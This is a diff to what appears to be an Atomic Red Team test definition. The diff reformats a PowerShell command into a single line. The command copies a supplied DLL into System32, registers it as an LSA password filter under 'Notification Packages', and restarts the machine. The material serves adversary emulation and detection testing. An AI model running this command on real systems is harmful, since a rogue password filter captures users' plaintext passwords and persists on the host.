@@ -19,9 +19,4 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-      $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename
-      $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
-      $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
-      $notificationPackagesValues += $passwordFilterName
-      Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
-      Restart-Computer -Confirm
+        $passwordFilterName = (Copy-Item \"#{input_dll}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename; $lsaKey = Get-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\'; $notificationPackagesValues = $lsaKey.GetValue('Notification Packages'); $notificationPackagesValues += $passwordFilterName; Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\' 'Notification Packages' $notificationPackagesValues;Restart-Computer -Confirm
